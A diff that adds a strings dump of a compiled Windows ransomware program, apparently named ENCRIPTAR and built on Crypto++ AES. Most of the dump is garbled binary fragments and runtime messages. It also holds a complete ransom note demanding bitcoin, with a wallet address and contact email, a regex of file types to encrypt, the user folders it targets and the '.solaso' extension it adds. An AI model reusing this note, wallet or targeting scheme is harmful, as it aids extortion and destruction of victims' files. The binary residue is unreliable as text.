@@ -1,0 +1,1625 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.pdata
+@_RDATA
+@.rsrc
+@.reloc
+L$ SUVWH
+\$ UVWH
+@SUWAVAWH
+@A_A^_][
+@SUWAVAWH
+@A_A^_][
+t$ WATAUAVAWH
+A_A^A]A\_
+@SVATAUH
+XA]A\^[
+@SUVAUH
+XA]^][
+@SVWATAUAVAWH
+@A_A^A]A\_^[
+t$ WAVAWH
+ A_A^_
+@USVWATAVAWH
+A_A^A\_^[]
+t$ UWATAVAWH
+A_A^A\_]
+t$ UWATAVAWH
+A_A^A\_]
+UVWAVAWH
+A_A^_^]
+WAVAWH
+UVWATAUAVAWH
+PA_A^A]A\_^]
+\$ UVWATAUAVAWH
+D$PHcH
+D$PHcH
+D$PHcH
+D$PHcH
+D$PHcH
+D$PHcH
+CUpLcCtH
+D$PHcH
+D$PHcH
+D$PHcH
+D$PHcH
+D$PHcH
+D$PHcH
+A_A^A]A\_^]
+L$ SUVH
+upH;~ uj
+|$ UAVAWH
+UVWAVAWH
+A_A^_^]
+<A/tSL
+<A\t?H
+UWATAVAWH
+t$(D8q@
+A_A^A\_]
+UAVAWH
+D$pHcH
+D$pHcH
+D$pHcH
+D$pHcH
+D$pHcH
+D$pHcH
+D$pHcH
+D$pHcH
+UATAUAVAWH
+fF9,Cu
+A_A^A]A\]
+l$ VWAVH
+<A/tI
+@SUVWAVH
+L90u"H
+0A^_^][
+|$ AVH
+@SVAVH
+l$ )8H
+L+t$ H
+t$ AVH
+t$ AVH
+WAVAWH
+0A_A^_
+WAVAWH
+0A_A^_
+@SUVWH
+|$ UAVAWH
+\$ UVWAVAWH
+@A_A^_^]
+|$ AVH
+WAVAWH
+0A_A^_
+UVWAVAWH
+PA_A^_^]
+|$ ATAVAWH
+@A_A^A\
+UVWAVAWH
+`A_A^_^]
+\$ UVWATAUAVAWH
+A_A^A]A\_^]
+@SVWATAUAVAWH
+PA_A^A]A\_^[
+@SVAVH
+@SUVAWH
+HA_^][
+@SUVWAVAWH
+HA_A^_^][
+HA_A^_^][
+HA_A^_^][
+UVWAVAWH
+A_A^_^]
+@SUVAWH
+HA_^][
+SWAUAWH
+XA_A]_[
+@SWATAVAWH
+ A_A^A\_[
+{|^uQH
+|$HHc{t
+C$9C w
+UVWATAUAVAWH
+#:D$0u
+pA_A^A]A\_^]
+@UVATAVAWH
+0A_A^A\^]
+l$ VWAVH
+UVWAVAWH
+ A_A^_^]
+@VWAUAVAWH
+ A_A^A]_^
+t$ UWATAVAWH
+A_A^A\_]
+UVWATAUAVAWH
+;n }1E
+A_A^A]A\_^]
+t$ M;4$t
+UVWATAUAVAWH
+ A_A^A]A\_^]
+@SWAWH
+{x\uaH
+;~ sRH
+VWATAVAWH
+ A_A^A\_^
+UVWATAUAVAWH
+A_A^A]A\_^]
+|$ AVH
+{|]unH
+\$ UVWH
+L;D$`u
+l$ VWAWH
+@SUVWATAUAVAWH
+A_A^A]A\_^][
+@SUVWH
+\$ VWAVH
+UVWATAUAVAWH
+ A_A^A]A\_^]
+@SUVWH
+L$ VWAVH
+uC9D$`u
+H9D$Pu
+|$ UATAUAVAWH
+A_A^A]A\]
+|$ UATAUAVAWH
+A_A^A]A\]
+SVATAVH
+HA^A\^[
+|$ AWH
+|$ UATAUAVAWH
+A_A^A]A\]
+\$ UVWAVAWH
+A_A^_^]
+@SUVWH
+|$ H9y
+H9|$ sKH
+@SUVAVH
+(A^^][
+@SUVWATAUAVAWH
+kPH+sxL
+A_A^A]A\_^][
+H+A(L;I(I
+@SVWAVAWH
+A_A^_^[
+SATAVH
+`A^A\[
+@SUVWATAVAWH
+H9\$0sKI
+A_A^A\_^][
+@SUVWH
+|$ ATAVAWE3
+A_A^A\
+\$ UVWATAUAVAWH
+A_A^A]A\_^]
+USVWATAUAVAWH
+A_A^A]A\_^[]
+t$ WAV3
+t$0A^_
+P(H+P H
+Q(H;Q0u
+B(H;B u
+P(H+P H
+A@H+A(I
+HcD$0H
+UVWAVAWH
+T$pH99H
+0A_A^_^]
+H;Q0t\H
+H9C u8H
+t$8H;B u
+O H9O(u9H
+H9A unH;N0tTH
+H9C u8H
+A(H;A u
+@ L9@(t
+SATAUAVAWH
+~8I)~@H+
+A_A^A]A\[
+@SUVWAVH
+A^_^][
+H9A(uW
+WATAUAVAWH
+s8H)s@H+
+0A_A^A]A\_
+SUVWAVH
+A^_^][
+@SWATAWH
+(A_A\_[
+K H9D$XL
+GenuineIH
+AuthentiH;
+HVWSATL
+)@`A\[_^
+HVWSUH
+$H;t$`
+T$pH;T$x
+l$ VWAVH
+x ATAVAWH
+@A_A^A\
+@USVWATAVAWH
+H9\$@t
+CL$0E3
+u3f9\$~t
+|$~.u$f9]
+A_A^A\_^[]
+\$ UVWH
+|$L.ui
+.uYf9l$PuRH
+x ATAVAWH
+0A_A^A\
+@UAVAWH
+@USVWAUAVAWH
+e@A_A^A]_^[]
+WAVAWH
+ A_A^_
+SVWAVH
+8A^_^[
+WAVAWH
+WAVAWH
+0A_A^_
+u0HcH<H
+ H3E H3E
+H3\$HH
+D8L$0uP
+VWATAVAWH
+ A_A^A\_^
+WATAUAVAWH
+A_A^A]A\_
+UAVAWH
+H;xXu5
+WATAUAVAWH
+A_A^A]A\_
+ffffff
+WATAUAVAWH
+A_A^A]A\_
+VWATAUAVAWL
+|$XHcU
+D$8HcJ
+H;D$Pu
+l$HA_A^A]A\_^
+x AVHcA
+SUVWATAUAVAWL
+H9D$PuCH
+A_A^A]A\_^][
+WATAUAVAWH
+A_A^A]A\_
+AUAVAWH
+u4I9}(
+3I9}(taH
+0A_A^A]
+AUAVAWH
+u4I9}(
+3I9}(taH
+0A_A^A]
+UVWATAUAVAWH
+`A_A^A]A\_^]
+UVWATAUAVAWH
+`A_A^A]A\_^]
+@USVWATAUAVAWH
+A_A^A]A\_^[]
+@USVWATAUAVAWH
+d$dD;d$lta
+A_A^A]A\_^[]
+UVWATAUAVAWH
+A_A^A]A\_^]
+@USVWATAUAVAWH
+A_A^A]A\_^[]
+WAVAWH
+@SVWATAUAVAWH
+L!|$(L!
+D$0HcH
+pA_A^A]A\_^[
+SVWATAUAWH
+A_A]A\_^[
+B(I9A(u
+SVWATAUAVAWH
+0A_A^A]A\_^[
+SVWATAUAVAWH
+A_A^A]A\_^[
+t$ WATAUAVAWH
+ A_A^A]A\_
+UVWATAUAVAWH
+ A_A^A]A\_^]
+UVWATAUAVAWH
+L$@D8l$Ht
+L!d$PH
+L$PD!d$X
+D8l$Ht
+D8l$Ht
+D8l$Ht
+A_A^A]A\_^]
+wKH9+u
+UAVAWH
+D88tS3
+L9:tgH
+<0t0<2t
+UATAUAVAWH
+L9d$Xt2A
+D8 t(H
+D8 tTH
+\$HD8d$PtB
+\$HD8d$QtB
+uSM9&tN
+D8d$ t
+A_A^A]A\]
+UAVAWH
+<1~=<3~*<4tK<5t
+UATAUAVAWH
+D8)u#L
+)u%D8)t
+D8(tLH
+A_A^A]A\]
+` UAVAWH
+L9d$ tOH
+<>u<8\$8
+t$08\$8
+UAVAWH
+H9tfI9
+UAUAVH
+L97t{L
+\$ D8t$(uZH
+` UAVAWH
+UATAUAVAWH
+H!|$ H
+L$ !|$(
+<>u:D8t$(
+|$ D8t$(
+H!|$ H
+L$ !|$(
+A_A^A]A\]
+x UATAUAVAWH
+A_A^A]A\]
+x UAVAWH
+WATAUAVAWH
+ A_A^A]A\_
+@USVWATAVAWH
+D8d$Xt
+A_A^A\_^[]
+@USVWATAVAWH
+D8d$Xt
+A_A^A\_^[]
+D$@H;G
+|$ AVH
+D$0H;G
+CA< t(<#t
+<htl<jt\<lt4<tt$<wt
+!,X< w
+t$ WAVAWH
+<Ct-<D
+<StW@:
+<g~{<itd<ntY<ot7<pt
+<utT@:
+D<P0@:
+k(+sPL
+0A_A^_
+t$ WATAUAVAWH
+s(+kPH
+A_A^A]A\_
+WAVAWH
+ A_A^_
+WAVAWH
+ A_A^_
+WAVAWH
+ A_A^_
+L$ VWAVH
+t$ WATAUAVAWH
+ A_A^A]A\_
+;D$Xs;
+L$ UVWATAUAVAWH
+0A_A^A]A\_^]
+T$ D)s
+t$ UWAUAVAWH
+A_A^A]_]
+8\$8t(H
+8\$8t(H
+s WATAUAVAWH
+D$h9t$P
+A_A^A]A\_
+u"8Z(t
+uF8Z(t
+vC8_(t
+u"8Z(t
+u"8Z(t
+uF8Z(t
+vB8_(t
+SUVWATAVAWH
+A_A^A\_^][
+fffffff
+fffffff
+fffffff
+fffffff
+ffffff
+fffffff
+fffffff
+fffffff
+fffffff
+ffffff
+ffffff
+ffffff
+u3HcH<H
+x ATAVAWH
+ A_A^A\
+UVWAVAWH
+0A_A^_^]
+WAVAWH
+0A_A^_
+t$ WAVAWH
+ A_A^_
+WAVAWH
+ A_A^_
+WAVAWH
+fE98t'
+0A_A^_
+@USVWATAUAVAWH
+A_A^A]A\_^[]
+9Cu,fD9y
+fB9<{u
+fD9,pu
+t$`fD9+t$I
+L$ SUVWH
+WATAUAVAWH
+0A_A^A]A\_
+\$ UVWATAUAVAWH
+fD9,Au
+A_A^A]A\_^]
+\$ UVWATAUAVAWH
+f9t$bu
+A_A^A]A\_^]
+H9L$Ht?H
+UVWATAUAVAWH
+fE9,Fu
+A_A^A]A\_^]
+ffffff
+>ffffff
+ffffff
+x AUAVAWH
+@A_A^A]
+VWATAVAWH
+?D8d$8t
+D8d$8t
+t'D8d$8t
+%D8d$8t
+A_A^A\_^
+@8l$Ht
+L$ UVWH
+WATAUAVAWH
+gfffffffH
+D8l$ht
+A_A^A]A\_
+fD9t$b
+D$0H9D$8
+UVWATAUAVAWH
+D8T8>t
+A_A^A]A\_^]
+VWATAVAW
+A_A^A\_^
+WATAUAVAWH
+ A_A^A]A\_
+\$ UVWATAUAVAWH
+H!D$ H
+`A_A^A]A\_^]
+WATAUAVAWH
+ A_A^A]A\_
+u9!\$0
+UVWATAUAVAWH
+ A_A^A]A\_^]
+t$ WATAUAVAW
+A_A^A]A\_
+\$ UVWATAUAVAWH
+DD8T$pu
+D8T$pt
+0A_A^A]A\_^]
+@SUVWATAUAVAWH
+8A_A^A]A\_^][
+x ATAVAWH
+0A_A^A\
+AUAVAWH
+ A_A^A]
+UVWATAUAVAWH
+@8t$HtsL
+`A_A^A]A\_^]
+WATAUAVAWH
+ A_A^A]A\_
+UWATAVAWH
+D8&t4H
+A_A^A\_]
+ATAVAWH
+D8d$8t
+@A_A^A\
+@USVWATAVAWH
+A_A^A\_^[]
+@UAVAWH
+e0A_A^]
+@SUVWATAVAWH
+A_A^A\_^][
+@UATAUAVAWH
+e0A_A^A]A\]
+@UATAUAVAWH
+H!T$0D
+ue!T$(H!T$ 
+A_A^A]A\]
+\$ VWATAUAVH
+D!l$xA
+@A^A]A\_^
+UAVAWH
+WAVAWH
+@A_A^_
+UVWATAUAVAWH
+`A_A^A]A\_^]
+WATAUAVAWH
+0A_A^A]A\_
+H97u+A
+\$ UVWATAUAVAWH
+@8|$Ht
+@8|$Ht
+@8|$Ht
+D$XD9x
+@8|$ht
+@8|$ht
+@8|$ht
+A_A^A]A\_^]
+UVWATAUAVAWH
+L$&8\$&t,8Y
+@A_A^A]A\_^]
+fD94Fu
+UVWATAUAVAWH
+xWI96tRI
+0A_A^A]A\_^]
+ATAVAWH
+0A_A^A\
+UATAUAVAWH
+A_A^A]A\]
+WATAUAVAWH
+A_A^A]A\_
+UATAUAVAWH
+A_A^A]A\]
+fB9<Hu
+fB9<@u
+fB9<Bu
+fB9,Nu
+fB9,Nu
+fB9,Nu
+fA9,Au
+f9)u:H
+fB94Ou
+x ATAVAWH
+ A_A^A\
+x ATAVAWH
+fG9$Ou
+0A_A^A\
+fB9<Hu
+fB9<@u
+fB9<Bu
+fD94Au
+fD94iu
+tSf91tNH
+tU;\$0tH
+WAVAWH
+ A_A^_
+@USVWATAVAWH
+tyfD9 tsH
+tQfD9 tK
+fD9$Hu
+@A_A^A\_^[]
+USVWAVH
+A^_^[]
+USVWAVH
+A^_^[]
+WATAUAVAWH
+ A_A^A]A\_
+@USVWATAUAVAWH
+D+d$8H
+#D8d$`t
+A_A^A]A\_^[]
+x ATAVAWH
+@A_A^A\
+s WAVAWH
+0A_A^_
+u~9t$Xt
+UATAUAVAWH
+A_A^A]A\]
+WAVAWH
+ A_A^_
+@USVWATAUAVAWH
+e8A_A^A]A\_^[]
+UVWATAUAVAWH
+@A_A^A]A\_^]
+ATAUAVH
+L$ fff
+L$ |+L;
+A^A]A\
+WAVAWH
+D8|$`t
+ A_A^_
+UVWAVAWH
+@A_A^_^]
+ffffff
+fffffff
+x ATAVAWH
+ A_A^A\
+LcA<E3
+u HcA<H
+regex_error(error_collate): The expression contained an invalid collating element name.
+regex_error(error_ctype): The expression contained an invalid character class name.
+regex_error(error_escape): The expression contained an invalid escaped character, or a trailing escape.
+regex_error(error_backref): The expression contained an invalid back reference.
+regex_error(error_brack): The expression contained mismatched [ and ].
+regex_error(error_paren): The expression contained mismatched ( and ).
+regex_error(error_brace): The expression contained mismatched { and }.
+regex_error(error_badbrace): The expression contained an invalid range in a { expression }.
+regex_error(error_range): The expression contained an invalid character range, such as [b-a] in most encodings.
+regex_error(error_space): There was insufficient memory to convert the expression into a finite state machine.
+regex_error(error_badrepeat): One of *?+{ was not preceded by a valid regular expression.
+regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level.
+regex_error(error_stack): There was insufficient memory to determine whether the regular expression could match the specified character sequence.
+regex_error(error_parse)
+regex_error(error_syntax)
+regex_error
+address family not supported
+address in use
+address not available
+already connected
+argument list too long
+argument out of domain
+bad address
+bad file descriptor
+bad message
+broken pipe
+connection aborted
+connection already in progress
+connection refused
+connection reset
+cross device link
+destination address required
+device or resource busy
+directory not empty
+executable format error
+file exists
+file too large
+filename too long
+function not supported
+host unreachable
+identifier removed
+illegal byte sequence
+inappropriate io control operation
+interrupted
+invalid argument
+invalid seek
+io error
+is a directory
+message size
+network down
+network reset
+network unreachable
+no buffer space
+no child process
+no link
+no lock available
+no message available
+no message
+no protocol option
+no space on device
+no stream resources
+no such device or address
+no such device
+no such file or directory
+no such process
+not a directory
+not a socket
+not a stream
+not connected
+not enough memory
+not supported
+operation canceled
+operation in progress
+operation not permitted
+operation not supported
+operation would block
+owner dead
+permission denied
+protocol error
+protocol not supported
+read only file system
+resource deadlock would occur
+resource unavailable try again
+result out of range
+state not recoverable
+stream timeout
+text file busy
+timed out
+too many files open in system
+too many files open
+too many links
+too many symbolic link levels
+value too large
+wrong protocol type
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+InitOnceExecuteOnce
+CreateEventExW
+CreateSemaphoreW
+CreateSemaphoreExW
+CreateThreadpoolTimer
+SetThreadpoolTimer
+WaitForThreadpoolTimerCallbacks
+CloseThreadpoolTimer
+CreateThreadpoolWait
+SetThreadpoolWait
+CloseThreadpoolWait
+FlushProcessWriteBuffers
+FreeLibraryWhenCallbackReturns
+GetCurrentProcessorNumber
+CreateSymbolicLinkW
+GetCurrentPackageId
+GetTickCount64
+GetFileInformationByHandleEx
+SetFileInformationByHandle
+GetSystemTimePreciseAsFileTime
+InitializeConditionVariable
+WakeConditionVariable
+WakeAllConditionVariable
+SleepConditionVariableCS
+InitializeSRWLock
+AcquireSRWLockExclusive
+TryAcquireSRWLockExclusive
+ReleaseSRWLockExclusive
+SleepConditionVariableSRW
+CreateThreadpoolWork
+SubmitThreadpoolWork
+CloseThreadpoolWork
+CompareStringEx
+GetLocaleInfoEx
+LCMapStringEx
+0123456789abcdefghijklmnopqrstuvwxyz
+0123456789abcdefghijklmnopqrstuvwxyz
+SchedulerKind
+MaxConcurrency
+MinConcurrency
+TargetOversubscriptionFactor
+LocalContextCacheSize
+ContextStackSize
+ContextPriority
+SchedulingProtocol
+DynamicProgressFeedback
+WinRTInitialization
+MaxPolicyElementKey
+RoInitialize
+RoUninitialize
+Access violation - no RTTI data!
+Bad dynamic_cast!
+bad exception
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__swift_1
+__swift_2
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+operator co_await
+operator<=>
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+`anonymous namespace'
+template-parameter-
+`template-parameter-
+generic-type-
+`generic-type-
+`non-type-template-parameter
+`template-type-parameter-
+`generic-class-parameter-
+`generic-method-parameter-
+`template-parameter
+`vtordispex{
+`vtordisp{
+`adjustor{
+`local static destructor helper'
+`template static data member constructor helper'
+`template static data member destructor helper'
+static 
+virtual 
+private: 
+protected: 
+public: 
+[thunk]:
+extern "C" 
+short 
+unsigned 
+volatile 
+volatile
+std::nullptr_t 
+std::nullptr_t
+<ellipsis>
+,<ellipsis>
+ noexcept
+double
+__int8
+__int16
+__int32
+__int64
+__int128
+<unknown>
+char8_t
+char16_t
+char32_t
+wchar_t
+__w64 
+UNKNOWN
+signed 
+ volatile
+`unknown ecsu'
+union 
+struct 
+class 
+coclass 
+cointerface 
+const 
+cli::array<
+cli::pin_ptr<
+{flat}
+`h````
+xpxxxx
+`h`hhh
+xwpwpp
+(null)
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+[aOni*{
+~ $s%r
+@b;zO]
+v2!L.2
+UUUUUU
+UUUUUU
+"e?<<<<<<l?
+Il?333333c?
+.i?0@I
+d?000000`?
+)|B?d!
+L?UUUUUUU?
+&?PPPPPPP?
+0X8b?~
+%GoU?*
+(T?j?Y
+Zod(^?
+D W?{W
+qS>g?h3
+c?FA@s}
+UUUUUU
+UUUUUU
+UUUUUU
+?UUUUUU
+?kxG2)
+?TY,>5
+?!5WOo
+?E=$% B
+?49HoKC
+CorExitProcess
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+?UUUUUU
+?UUUUUU
+?UUUUUU
+?UUUUUU
+NAN(SNAN)
+nan(snan)
+NAN(IND)
+nan(ind)
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+UTF-16LEUNICODE
+AreFileApisANSI
+EnumSystemLocalesEx
+GetDateFormatEx
+GetTimeFormatEx
+GetUserDefaultLocaleName
+IsValidLocaleName
+LCIDToLocaleName
+LocaleNameToLCID
+AppPolicyGetProcessTerminationMethod
+AppPolicyGetThreadInitializationType
+A03>A|
+Q5rHg,>
+Hk=>:
+j>>A?1
+.>PJ;I:qE>
+:>t6k'
+])6M>&
+CWD>~3
+_oD>Kg
+N>O=I9
+F>qUxv
+/2GG>!B
+zY;>u:m
+P>q_Y~
+0><[cZUg^>
+Y>kX>M
+H[><y5
+[*ncd>0
+S>$hkDh$h>[2
+UA>N0Wl
+9>powf
+?8bunz8
+?@En[vP
+?UUUUUU
+?7zQ6$
+1#QNAN
+1#SNAN
+UUUUUU
+UUUUUU
+=imb;D
+/>58d%
+VM>cQ6
+>jtm}S
+)>6{1n
++f)>0'
+;H9>&X
+*StO9>T
+n03>Pu
+K~Je#>!
+bp(=>?g
+BC?>6t9^
+K&>.yC
+.xJ>Hf
+y\PD>!
+|b=})>
+c [1>H'
+uzKs@>
+3>N;kU
+kE>fvw
+V6E>`"(5
+>Unknown exception
+bad array new length
+generic
+iostream
+iostream stream error
+bad cast
+bad locale name
+ios_base::badbit set
+ios_base::failbit set
+ios_base::eofbit set
+invalid string position
+string too long
+vector too long
+()$^.*+?[]|\-{},:=!
+system
+unknown error
+', trying to retrieve '
+', stored '
+NameValuePairs: type mismatch for '
+Clone() is not implemented yet.
+unknown
+: this object doesn't support resynchronization
+StreamTransformation: this object doesn't support random access
+BufferedTransformation: this object is not attachable
+InputBuffer
+" not used
+AlgorithmParametersBase: parameter "
+CipherModeBase: feedback size cannot be specified for this cipher mode
+t;rke;tlrke65409654ytr
+invalid char filename argument
+remove(p): invalid argument
+\__READ_ME_TO_RECOVER_YOUR_FILES.txt
+Hello, your files were encrypted and are currently unusable.
+The only way to recover your files is decrypting them with a key that only we have.
+In order for us to send you the key and the application to decrypt your files, you will have to make a transfer of Bitcoins
+to an electronic wallet. We leave you here the data to make the bitcoins transfer.
+Bitcoin wallet: 3QtbAioBSw249J5xsGd1sCqTqhdDX4CD9L
+Transfer the amount of bitcoins equivalent to 50 USD.
+Your computer ID is: 
+Once you make the transfer of bitcoins, send us the transfer ID and your computer ID to our email: sammy70p_y61m@buxod.com
+When we verify the transfer we will send you your key and the decryption application.
+\.(?:cpp|cc|cxx|h|hh|hpp|hxx)
+USERPROFILE
+/Documents/
+\.(?:exe|msi|doc|docx|xls|xlsx|xlsm|ppt|pdf|jpg|jpeg|png|rar|7z|zip|bdf|fmp12|db|mdb|itdb|dbf|pdb|wdb|edb|mdb|db3|ddl|frm|sql|sqlite|dbc|dbs|bkf|mp3|mp4|mkv|avi|wave|iso|pptx|ppt|pptm|EXE|MSI|DOC|DOCX|XLS|XLSX|XLSM|PPT|PDF|JPG|JPEG|PNG|RAR|ZIP|BDF|FMP12|DB|MDB|ITDB|DBF|PDB|WDB|EDB|MDB|DB3|DDL|FRM|SQL|SQLITE|DBC|DBS|BKF|MP3|MP4|MKV|AVI|WAVE|ISO|PPTX|PPT|PPTM|html|htm|js|jse|php|xml|xsl|bin|vbs|max|psd|aep|sln|cpp|h|vhd|VHD|bak|BAK|vmdk|VMDK|vmsn|VMSN|TIB|MDF|mdf|tib)
+.solaso
+/Pictures/
+/Music/
+/Downloads/
+/Videos/
+/Desktop/
+invalid wchar_t filename argument
+OutputStringPointer
+StringSink: OutputStringPointer not specified
+BufferedTransformation: this object doesn't allow input
+list too long
+vector<bool> too long
+xdigit
+: this object requires an IV
+: this object cannot use a null IV
+ is less than the minimum of 
+: IV length 
+ exceeds the maximum of 
+: this object does't support a special last block
+BitBucket
+: this object doesn't support multiple channels
+ is not a valid key length
+ValueNames
+BlockPaddingScheme
+OutputBuffer
+FilterWithBufferedInput: invalid buffer size
+FilterWithBufferedInput
+ArraySink: missing OutputBuffer argument
+StreamTransformationFilter: please use AuthenticatedEncryptionFilter and AuthenticatedDecryptionFilter for AuthenticatedSymmetricCipher
+StreamTransformationFilter: PKCS_PADDING and ONE_AND_ZEROS_PADDING cannot be used with 
+StreamTransformationFilter: plaintext length is not a multiple of block size and NO_PADDING is specified
+StreamTransformationFilter: ciphertext length is not a multiple of block size
+StreamTransformationFilter: invalid PKCS #7 block padding found
+StreamTransformationFilter: invalid ones-and-zeros padding found
+StringStore: missing InputBuffer argument
+deque<T> too long
+: Nonblocking input is not implemented by this object.
+RoundUpToMultipleOf: integer overflow
+bad allocation
+NodeSize
+C:\Users\MARIO\source\repos\ENCRIPTAR\x64\Release\ENCRIPTAR.pdb
+.text$di
+.text$mn
+.text$mn$00
+.text$x
+.text$yd
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCC
+.CRT$XCL
+.CRT$XCU
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XLA
+.CRT$XLZ
+.CRT$XPA
+.CRT$XPB
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$T
+.rdata$r
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.tls$ZZZ
+.xdata
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data$r
+.pdata
+_RDATA
+.rsrc$01
+.rsrc$02
+`08~Px
+"&$6&((6
+j*V,L.
+"&466(86
+Z:V<L>
+"&D6F(H6
+bJVLLN
+"&T6V(X6
+ZZV\L^
+"&d6f(h6
+RjVlLn
+"&r6t(v6
+dxVzL|
+@08~Px
+@08~Px
+`08B`"
+GetModuleFileNameW
+SetFileAttributesW
+CloseHandle
+CreateProcessW
+GetConsoleWindow
+KERNEL32.dll
+ShowWindow
+USER32.dll
+RegGetValueW
+ADVAPI32.dll
+GetLastError
+FormatMessageW
+WideCharToMultiByte
+CreateFileW
+FindClose
+FindFirstFileExW
+FindNextFileW
+GetFileAttributesExW
+SetEndOfFile
+SetFilePointerEx
+AreFileApisANSI
+MultiByteToWideChar
+GetCurrentThreadId
+WaitForSingleObjectEx
+SwitchToThread
+GetExitCodeThread
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+SetLastError
+InitializeCriticalSectionAndSpinCount
+CreateEventW
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+GetSystemTimeAsFileTime
+GetModuleHandleW
+GetProcAddress
+EncodePointer
+DecodePointer
+GetCPInfo
+QueryPerformanceCounter
+CompareStringW
+LCMapStringW
+GetLocaleInfoW
+GetStringTypeW
+InitializeSListHead
+SetEvent
+ResetEvent
+RtlCaptureContext
+RtlLookupFunctionEntry
+RtlVirtualUnwind
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetCurrentProcess
+TerminateProcess
+IsProcessorFeaturePresent
+IsDebuggerPresent
+GetStartupInfoW
+GetCurrentProcessId
+CreateThread
+GetCurrentThread
+GetThreadTimes
+FreeLibrary
+FreeLibraryAndExitThread
+LoadLibraryExW
+InterlockedPushEntrySList
+RtlUnwindEx
+RtlPcToFileHeader
+RaiseException
+ExitThread
+GetModuleHandleExW
+SetEnvironmentVariableW
+RemoveDirectoryW
+DeleteFileW
+ExitProcess
+GetStdHandle
+WriteFile
+GetCommandLineA
+GetCommandLineW
+HeapAlloc
+HeapFree
+GetFileType
+GetFileSizeEx
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+IsValidLocale
+GetUserDefaultLCID
+EnumSystemLocalesW
+HeapReAlloc
+ReadFile
+ReadConsoleW
+HeapSize
+IsValidCodePage
+GetACP
+GetOEMCP
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+GetProcessHeap
+SetStdHandle
+WriteConsoleW
+RtlUnwind
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVinvalid_argument@std@@
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AVregex_error@std@@
+.?AV_Locimp@locale@std@@
+.?AVtype_info@@
+.?AV__non_rtti_object@std@@
+.?AVbad_typeid@std@@
+.?AVbad_exception@std@@
+.?AVDNameNode@@
+.?AVcharNode@@
+.?AVpcharNode@@
+.?AVpDNameNode@@
+.?AVDNameStatusNode@@
+.?AVpairNode@@
+.?AVfailure@ios_base@std@@
+.?AVruntime_error@std@@
+.?AVbad_alloc@std@@
+.?AVerror_category@std@@
+.?AV?$ctype@D@std@@
+.?AVsystem_error@std@@
+.?AV_Facet_base@std@@
+.?AV_Generic_error_category@std@@
+.?AU_Crt_new_delete@std@@
+.?AV_Iostream_error_category@std@@
+.?AVbad_cast@std@@
+.?AUctype_base@std@@
+.?AVfacet@locale@std@@
+.?AV_System_error@std@@
+.?AVexception@std@@
+.?AVbad_array_new_length@std@@
+.?AV?$CipherModeFinalTemplate_CipherHolder@V?$BlockCipherFinal@$00VDec@Rijndael@CryptoPP@@@CryptoPP@@VECB_OneWay@2@@CryptoPP@@
+.?AV?$_Ref_count_resource@PEAPEAXP6AXPEAPEAX@Z@std@@
+.?AV?$SourceTemplate@VStringStore@CryptoPP@@@CryptoPP@@
+.?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@
+.?AVCipherModeBase@CryptoPP@@
+.?AV?$codecvt@DDU_Mbstatet@@@std@@
+.?AVBase@Rijndael@CryptoPP@@
+.?AVBlockTransformation@CryptoPP@@
+.?AV?$AutoSignaling@V?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@@CryptoPP@@
+.?AV?$basic_ifstream@DU?$char_traits@D@std@@@std@@
+.?AVStreamTransformation@CryptoPP@@
+.?AV?$InputRejecting@VFilter@CryptoPP@@@CryptoPP@@
+.?AVSimpleKeyingInterface@CryptoPP@@
+.?AV_Node_if@std@@
+.?AVBlockOrientedCipherModeBase@CryptoPP@@
+.?AVfilesystem_error@v1@filesystem@experimental@std@@
+.?AV?$collate@D@std@@
